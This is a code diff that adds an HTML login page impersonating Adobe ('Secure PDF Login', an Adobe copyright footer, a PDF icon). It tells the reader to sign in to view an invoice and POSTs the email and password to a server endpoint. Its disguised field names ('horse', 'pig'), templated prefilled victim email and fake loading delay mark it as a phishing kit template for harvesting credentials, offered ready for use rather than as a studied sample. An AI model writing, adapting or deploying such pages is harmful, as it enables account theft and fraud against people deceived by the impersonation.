@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login | Secure PDF Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #f8fafc;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Loader */
+    #loader {
+      position: absolute;
+      top: 0; left: 0;
+      height: 100vh; width: 100%;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #e5e7eb;
+      border-top: 5px solid #e11d48;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1000px;
+      height: 100%;
+      max-height: 1000px;
+      background-color: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      display: none; /* Hide until loader is done */
+    }
+
+    .logo {
+      width: 90px;
+      margin-bottom: 30px;
+    }
+
+    h2 {
+      font-size: 28px;
+      color: #1f2937;
+      margin-bottom: 6px;
+    }
+
+    p {
+      color: #6b7280;
+      margin-bottom: 24px;
+      font-size: 15px;
+    }
+
+    form {
+      width: 100%;
+      max-width: 420px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      background-color: #f9fafb;
+      font-size: 15px;
+      color: #111827;
+      transition: border 0.3s ease;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #2563eb;
+      outline: none;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      background-color: #e11d48;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #9f1239;
+    }
+
+    .footer {
+      margin-top: 40px;
+      font-size: 13px;
+      color: #9ca3af;
+      text-align: center;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 24px;
+      }
+
+      h2 {
+        font-size: 24px;
+      }
+
+      p {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loading Spinner -->
+  <div id="loader">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Login Container -->
+  <div class="container" id="main-content">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="PDF Logo" class="logo" />
+    
+    <h2>Secure PDF Login</h2>
+    <p>Login to access the Invoice</p>
+
+    <form action="first" method="POST">
+      <input type="text" name="horse" placeholder="Email address" value="{{eman}}" required>
+      <input type="password" name="pig" placeholder="Password" required>
+      <input type="submit" value="Sign In">
+    </form>
+
+    <div class="footer">
+      &copy; <span id="year"></span> Adobe Systems Incorporated. All rights reserved.
+    </div>
+  </div>
+
+  <!-- Script -->
+  <script>
+    // Show content after loading
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("main-content").style.display = "flex";
+      }, 1200); // 1.2s delay
+    });
+
+    // Dynamic copyright year
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+
+</body>
+</html>
